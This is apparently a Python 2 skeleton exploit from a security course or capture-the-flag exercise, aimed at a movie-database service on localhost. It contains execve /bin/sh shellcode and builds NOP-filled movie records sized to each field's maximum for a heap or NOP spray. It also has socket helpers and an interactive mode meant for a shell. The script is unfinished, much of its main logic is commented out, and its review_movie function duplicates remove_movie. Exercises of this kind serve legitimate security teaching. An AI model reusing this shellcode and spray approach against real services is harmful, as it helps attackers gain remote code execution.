#!/usr/bin/python

from sock import *
import sys
import time

###############################################################################
#
#   Skeleton exploit for use                                                  #
#   Uses a nice socket library (https://github.com/hellman/sock/)             #
#   Actually read this ans feel free to modify!                               #
#
###############################################################################

HOST = "localhost"
PORT = "55000"
NOP  = "\x90"

# Some useful shellcode (Not Aleph One's, but it does exec \bin\sh)
SHELLCODE = "\x6a\x0b\x58\x99\x52\x68\x2f\x2fsh\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

hacker = {"title":"Hackers",
          "director":"Iain Softley",
          "star1":"Jonny Lee Miller",
          "star2":"Angelina Jolie",
          "star3":"Jessie Bradford",
          "star4":"Matthew Lillard",
          "star5":"Laurence Mason",
          "summary":"A young boy is arrested by the US Secret Service for writing a computer virus and is banned from using a computer until his 18th birthday. Years later, he and his new-found friends discover a plot to unleash a dangerous computer virus, but they must use their computer skills to find the evidence while being pursued by the Secret Service and the evil computer genius behind the virus.",
          "country":"USA",
          "budget":"UNK",
          "opening_weekend":"UNK",
          "gross":"$7,564,000",
          "runtime":"107 min",
          "aspect":"2.35 : 1",
          "composer":"Someone",
          "average_rating":"5.0"}

################################################################################
#
#   pause_script
#
#   A useful function to wait for the user to press enter, that way you can 
#   put in pause points easily
#
################################################################################
def pause_script():
    raw_input("Paused... Press enter to continue: ")

################################################################################
#
#   connect
#
################################################################################
def connect():
    con = Sock(HOST + ":" + PORT)
    return con

################################################################################
#
#   clear_read_buffer
#
#   This will clear the read buffer and print all of it
#
################################################################################
def clear_read_buffer(con):
    r = con.read_one(0)
    while len(r) > 0:
        print r
        r = con.read_one(0)

################################################################################
#
#   remove_movie
#
#   This will remove a movie, and tell you success
#
################################################################################
def remove_movie(title,con):
    # Choose the remove option from the main menu
    #con.send_line("d")
    con.send("d") 
    con.send("\n") 

    # Wait for a response
    time.sleep(1)

    # Clear out the read buffer
    con.read_one(0)
    
    # Send the movie title
    con.send_line(title)

    # Wait for a response
    time.sleep(1)

    # Read the response
    resp = con.read_line()

    # Did we delete the movie?
    return "Removed movie!" in resp

################################################################################
#
#   review_movie
#
#   This will review a movie
#
################################################################################
def review_movie(title,con):
    # Choose the remove option from the main menu
    con.send_line("d")
    
    # Wait for a response
    time.sleep(1)

    # Clear out the read buffer
    con.read_one(0)
    
    # Send the movie title
    con.send_line(title)

    # Wait for a response
    time.sleep(1)

    # Read the response
    resp = con.read_line()

    # Did we delete the movie?
    return "Removed movie!" in resp

################################################################################
#
#   send_movie
#
#   This will add a movie
#
################################################################################
def send_movie(movie,con):
    # Choose the add option
    con.send_line("a")

    # Send all the data in order
    con.send_line(movie["title"])
    pause_script()
    con.send_line(movie["director"])
    con.send_line(movie["star1"])
    con.send_line(movie["star2"])
    con.send_line(movie["star3"])
    con.send_line(movie["star4"])
    con.send_line(movie["star5"])
    con.send_line(movie["summary"])
    con.send_line(movie["country"])
    con.send_line(movie["budget"])
    con.send_line(movie["opening_weekend"])
    con.send_line(movie["gross"])
    con.send_line(movie["runtime"])
    con.send_line(movie["aspect"])
    con.send_line(movie["composer"])
    con.send_line(movie["average_rating"])

################################################################################
#
#   send_movie_max
#
#   This will add a movie using send instead of send_line, thus not sending 
#   newlines which messup when we send max length movie fields
#
################################################################################
def send_movie_max(movie,con):
    # Choose the add option
    con.send_line("a")

    # Send all the data in order
    con.send(movie["title"])
    con.send(movie["director"])
    con.send(movie["star1"])
    con.send(movie["star2"])
    con.send(movie["star3"])
    con.send(movie["star4"])
    con.send(movie["star5"])
    con.send(movie["summary"])
    con.send(movie["country"])
    con.send(movie["budget"])
    con.send(movie["opening_weekend"])
    con.send(movie["gross"])
    con.send(movie["runtime"])
    con.send(movie["aspect"])
    con.send(movie["composer"])
    con.send(movie["average_rating"])

################################################################################
#
#   go_interactive
#
#   Switches to an interactive mode, good for shells maybe
#   You can't get out of interactive mode
#
################################################################################
def go_interactive(con):
    while True:
        time.sleep(1)
        print con.read_one(0)
        con.write(sys.stdin.readline())

################################################################################
#
#   hijack_execution
#
################################################################################
def hijack_execution(con):

    movie_title = "Hackers"
    # Delete the movie
    if remove_movie(movie_title, con):
        print "Deleted!"
    else:
        print "Didn't delete :("

################################################################################
#
#   build_nop_string
#
################################################################################
def build_nop_string(size):
    nop_string = ""

    for i in range(0, size):
        nop_string += NOP

    return nop_string

################################################################################
#
#   build_movie
#
################################################################################
def build_movie():

    title           = build_nop_string(500 - 1)
    director        = build_nop_string(300 - 1)
    star1           = build_nop_string(300 - 1)
    star2           = build_nop_string(300 - 1)
    star3           = build_nop_string(300 - 1)
    star4           = build_nop_string(300 - 1)
    star5           = build_nop_string(300 - 1)
    summary         = build_nop_string(2000 - 1)
    country         = build_nop_string(30 - 1)
    budget          = build_nop_string(80 - 1)
    opening_weekend = build_nop_string(80 - 1)
    gross           = build_nop_string(80 - 1)
    runtime         = build_nop_string(80 - 1)
    aspect          = build_nop_string(40 - 1)
    composer        = build_nop_string(300 - 1)
    average_rating  = build_nop_string(3 - 1)

    movie = {           
              "title" : title,
           "director" : director,
              "star1" : star1,
              "star2" : star2,
              "star3" : star3,
              "star4" : star4,
              "star5" : star5,
            "summary" : summary,
            "country" : country,
             "budget" : budget,
    "opening_weekend" : opening_weekend,
              "gross" : gross,
            "runtime" : runtime,
             "aspect" : aspect,
           "composer" : composer,
     "average_rating" : average_rating
    }

    return movie

################################################################################
#
#   Main
#
################################################################################


# Start the connection
con = connect()

#pause_script()


movie = build_movie()
send_movie(movie, con)

#go_interactive(con)

# Create reviews to amplify the spray

#hijack_execution(con)

#send_movie(hacker,con)
#if remove_movie("Hackers",con):
#if remove_movie(build_nop_string(500),con):
#    print "Deleted!"
#else:
#    print "Didn't delete :("
